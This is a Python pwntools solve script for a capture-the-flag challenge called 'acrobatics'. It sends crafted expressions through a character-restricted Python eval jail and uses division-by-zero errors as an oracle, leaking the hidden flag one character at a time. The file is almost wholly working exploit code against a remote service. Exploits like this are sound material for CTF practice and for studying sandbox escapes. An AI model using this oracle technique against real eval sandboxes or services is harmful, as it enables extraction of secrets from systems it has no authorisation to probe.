#!/usr/bin/env python3
from pwn import *
from string import ascii_lowercase




def conn():
    if args.REMOTE:
        return remote('acrobatics.ctf.ingeniums.club', 1337, ssl=True)
    else:
        return process(['python3', 'main.py'])
    


r = conn()
r.recvline()

one = '(ord(flag[False])//ord(flag[False]))'

def number(n):
    if n == 0:
        return 'False'
    elif n == 1:
        return one
    else:
        return one+'+'+number(n-1)
    

base = 'False/(ord(flag[{}])-({}))'


pay = base.format(number(0), number(ord('i')))
# r.sendline(pay)



whitelist = ''
for c in ascii_lowercase:
    whitelist += c

whitelist += '_{}'



i = 0
flag = ''
while True:
    s = i
    for c in whitelist:
        pay = base.format(number(i), number(ord(c)))
        assert len(set(pay)) <= 17


        r.sendline(pay.encode())

        # sleep(0.3)
        out = r.recvline()
        if b'yup' in out:
            flag += c
            print(flag)
            i += 1
            break

    if s == i:
        print("looped")
        break
    




r.interactive()